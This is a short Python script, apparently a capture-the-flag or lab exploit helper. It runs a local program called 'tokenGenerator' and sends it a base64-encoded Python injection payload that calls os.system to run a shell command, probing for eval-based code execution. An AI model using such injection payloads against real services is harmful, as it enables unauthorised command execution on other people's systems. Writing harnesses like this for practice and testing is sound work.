import subprocess
import base64
# Define the inputs to be provided to the script

MAX = 1
token = "__import__('os').system('ls -al')"

for i in range(MAX):
    token = token

    # Create the process
    process = subprocess.Popen(
        ['./tokenGenerator'],            # Command to execute the script
        stdin=subprocess.PIPE,  # Standard input to the process
        stdout=subprocess.PIPE, # Standard output from the process
        stderr=subprocess.PIPE  # Standard error from the process
    )
    
    temp = base64.b64encode(token.encode("ascii"))
    print(temp)
    # Provide the inputs to the process
    # The inputs must be encoded to bytes and joined with newlines
    inputs = f"3\n{temp}\n".encode()

    # Communicate the inputs and capture the output and error (if any)
    output, error = process.communicate(inputs)

    # Print the outputs (decode bytes to string)
    print("Output:", output.decode())
    print("Error:", error.decode())